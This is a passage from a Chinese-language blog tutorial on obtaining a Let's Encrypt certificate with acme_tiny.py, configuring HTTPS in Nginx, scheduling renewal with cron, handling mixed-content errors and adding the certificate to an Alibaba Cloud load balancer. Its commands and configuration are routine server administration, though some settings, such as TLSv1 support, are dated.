class=&quot;line&quot;&gt;Registering account...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Already registered!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Traceback (most recent call last):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 198, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    main(sys.argv[1:])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 194, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; main&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    signed_crt = get_crt(args.account_key, args.csr, args.acme_dir, &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;=LOGGER, CA=args.ca)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 123, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; get_crt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    wellknown_path, wellknown_url))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ValueError: Wrote file to /var/www/challenges/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg, but couldn&lt;span class=&quot;string&quot;&gt;&#39;t download http://ihaozhuo.com/.well-known/acme-challenge/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;5）脚本问题：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;记得在网站记得域名解析要对，都是你现在申请证书这台外网解析地址： &lt;code&gt;http://ihaozhuo.com/&lt;/code&gt;不通那解析就出现问题了。&lt;/li&gt;
&lt;li&gt;网上也有很多人说域名DNS服务器解析导致域名不行，这个验证了以后不是的，这个是GitHub这个脚本&lt;code&gt;acme_tiny.py&lt;/code&gt;问题导致的，需要编辑脚本注释掉下面全部内容即可 116行-123行：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  try:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#     resp = urlopen(wellknown_url)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#    resp_data = resp.read().decode(&#39;utf8&#39;).strip()&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#   assert resp_data == keyauthorization&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# except (IOError, AssertionError):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#    os.remove(wellknown_path)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#   raise ValueError(&quot;Wrote file to &amp;#123;0&amp;#125;, but couldn&#39;t download &amp;#123;1&amp;#125;&quot;.format(&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#      wellknown_path, wellknown_url))&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果修改没有用，可以到我这里下载Github下载&lt;a href=&quot;https://github.com/yangcvo/Let-s-Encrypt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;acme_tiny.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6）然后保存再次获取网站证书&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing account key...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing CSR...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Registering account...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Already registered!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ihaozhuo.com verified!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying www.ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;www.ihaozhuo.com verified!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Signing certificate...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Certificate signed!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zhengshu2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;㊗️ 如果看到如上内容，那么恭喜你，你的网站证书已经成功获取了。这时候查看目录下面有如下几个文件：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ll&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;总用量 36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3月  30 16:42 account.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;drwxr-xr-x 4 root root 4096 3月  30 17:31 acme-tiny&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 9159 3月  30 19:23 acme_tiny.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1639 3月  30 17:00 domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3月  30 16:53 domain.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 2159 3月  30 22:11 signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到目前为止我们已经成功申请到Let’sENcrpyt的网站证书，对于Nginx用户我们还需要把Let’s ENcrpyt的中间证书加入到刚刚生成的signed.crt文件中。具体操作：&lt;/p&gt;
&lt;h3 id=&quot;第五步：安装证书&quot;&gt;&lt;a href=&quot;#第五步：安装证书&quot; class=&quot;headerlink&quot; title=&quot;第五步：安装证书&quot;&gt;&lt;/a&gt;第五步：安装证书&lt;/h3&gt;&lt;p&gt;证书生成后，就可以把它配置在web 服务器上了，需要注意的是，Nginx需要追加一个Let’s Encrypt的中间证书，在 Nginx 配置中，需要把中间证书和网站证书合在一起：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &amp;gt; intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat signed.crt intermediate.pem &amp;gt; chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ll&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;总用量 36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3月  30 22:06 account.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 9159 3月  30 19:23 acme_tiny.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3834 3月  30 22:51 chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1639 3月  30 22:07 domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3月  30 22:06 domain.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1675 3月  30 22:51 intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 2159 3月  30 22:51 signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;1）现在我们可以在Nginx启动HTTPS，你可以直接在你之前网站Nginx.conf里面配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注意⚠️ ：为了不影响现在正在运行的网站，在配置HTTPS的时候最好将你现在配置好的文件全部备份起来，这样你在启动HTTPS出现问题可以能够快速恢复回来。&lt;/p&gt;
&lt;p&gt;Nginx配置文件加入以下配置：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name ihaozhuo.com, www.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    location /.well-known/acme-challenge/ &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;alias&lt;/span&gt; /var/www/challenges/;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        try_files &lt;span class=&quot;variable&quot;&gt;$uri&lt;/span&gt; =404;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ...the rest of your config&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 443;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name ihaozhuo.com, www.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_certificate /srv/ssl/chained.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_certificate_key /srv/ssl/domain.key;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_session_timeout 5m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_session_cache shared:SSL:50m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_prefer_server_ciphers on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ...the rest of your config&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在Chrome浏览器里面你可以访问https开头的，但没有看到绿色锁标记，这是因为你网站有请求&lt;code&gt;http://xxx&lt;/code&gt;资源，这个问题我遇到以后查了很多，因为我网站很早之前就有了，里面配置的地址都是http要修改过来非常麻烦，所以申请证书一开始域名下来就要申请这是最好的，如果你情况已经跟我一样，那你需要把所有的&lt;code&gt;http://xxxx&lt;/code&gt; 资源全部切换成：&lt;a href=&quot;https://xxx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://xxx&lt;/a&gt; 的资源，这样绿色的锁才会出现。&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zhengshu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;第六步：定期更新&quot;&gt;&lt;a href=&quot;#第六步：定期更新&quot; class=&quot;headerlink&quot; title=&quot;第六步：定期更新&quot;&gt;&lt;/a&gt;第六步：定期更新&lt;/h3&gt;&lt;p&gt;访问查看下网站详细信息：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 conf]&lt;span class=&quot;comment&quot;&gt;#  curl -v https://www.ihaozhuo.com/home.html&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* About to connect() to www.ihaozhuo.com port 443 (&lt;span class=&quot;comment&quot;&gt;#0)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*   Trying 120.27.185.86...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Connected to www.ihaozhuo.com (120.27.185.86) port 443 (&lt;span class=&quot;comment&quot;&gt;#0)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Initializing NSS with certpath: sql:/etc/pki/nssdb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*   CAfile: /etc/pki/tls/certs/ca-bundle.crt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  CApath: none&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Server certificate:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	subject: CN=ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	start date: 3月 30 13:51:00 2017 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	expire date: 6月 28 13:51:00 2017 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	common name: ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	issuer: CN=Let&lt;span class=&quot;string&quot;&gt;&#39;s Encrypt Authority X3,O=Let&#39;&lt;/span&gt;s Encrypt,C=US&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Peer&lt;span class=&quot;string&quot;&gt;&#39;s Certificate issuer is not recognized.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Closing connection 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl: (60) Peer&#39;s Certificate issuer is not recognized.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;More details here: http://curl.haxx.se/docs/sslcerts.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl performs SSL certificate verification by default, using a &lt;span class=&quot;string&quot;&gt;&quot;bundle&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; of Certificate Authority (CA) public keys (CA certs). If the default&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; bundle file isn&lt;span class=&quot;string&quot;&gt;&#39;t adequate, you can specify an alternate file&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; using the --cacert option.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If this HTTPS server uses a certificate signed by a CA represented in&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; the bundle, the certificate verification probably failed due to a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; problem with the certificate (it might be expired, or the name might&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; not match the domain name in the URL).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If you&#39;d like to turn off curl&lt;span class=&quot;string&quot;&gt;&#39;s verification of the certificate, use&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; the -k (or --insecure) option.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Let’s Encrypt 签发的证书只有90天有效期，但可以通过脚本定期更新。你可以创建了一个自动更新脚本&lt;code&gt;renew_cert.sh&lt;/code&gt;，内容如下：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/usr/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;python /srv/ssl/acme_tiny.py --account-key /srv/ssl/account.key --csr /srv/ssl/domain.csr --acme-dir /var/www/challenges/ &amp;gt; /srv/ssl/signed.crt || &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &amp;gt; intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /srv/ssl/signed.crt intermediate.pem &amp;gt; /srv/ssl/chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service nginx reload&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改crontab配置，加入以下内容：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#每个月执行一次&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0 0 1 * * /srv/ssl/renew_cert.sh 2&amp;gt;&amp;gt; /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/acme_tiny.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大功告成，不过先别急，访问下自己的HTTPS网站是否正常，不出意外的话，网站正式启用HTTPS，但是网站如果有用CDN的话，那么需要CDN也支持HTTPS才行，否则无法正常加载CDN的资源，类似的错误如：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Mixed Content: The page at &lt;span class=&quot;string&quot;&gt;&#39;https://ihaozhuo.com/&#39;&lt;/span&gt; was loaded over HTTPS, but requested an insecure script &lt;span class=&quot;string&quot;&gt;&#39;http://app.h5.ihaozhuo.combdimg.com/yjk/css/jquery.min.js&#39;&lt;/span&gt;. This request has been blocked; the content must be served over HTTPS.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一种解决方法就是使用Upyun来解决这个问题。可参考：我写的一篇文章如何解决https跨站访问证书不安全访问。&lt;/p&gt;
&lt;p&gt;一种解决方法就是使用七牛的云存储来解决这个问题。可参考：&lt;a href=&quot;https://blog.blahgeek.com/qiniu-cdn-serve-static/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.blahgeek.com/qiniu-cdn-serve-static/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;阿里云SLB如何配置HTTPS&quot;&gt;&lt;a href=&quot;#阿里云SLB如何配置HTTPS&quot; class=&quot;headerlink&quot; title=&quot;阿里云SLB如何配置HTTPS&quot;&gt;&lt;/a&gt;阿里云SLB如何配置HTTPS&lt;/h2&gt;&lt;p&gt;使用阿里云很简单，不需要太多的配置不过个人还是喜欢Nginx去做代理访问。&lt;/p&gt;
&lt;p&gt;公司后期更新了本地的Nginx去做负载均衡直接使用SLB ，这里记录下申请了证书以后只需要&lt;code&gt;chained.pem&lt;/code&gt;和私钥&lt;code&gt;domain.key&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在SLB负载均衡左侧有证书管理-创建证书-选择服务器证书。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx-ssl2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后在负载均衡上面设置下监听端口选择下对应证书就可以了。 &lt;/p&gt;
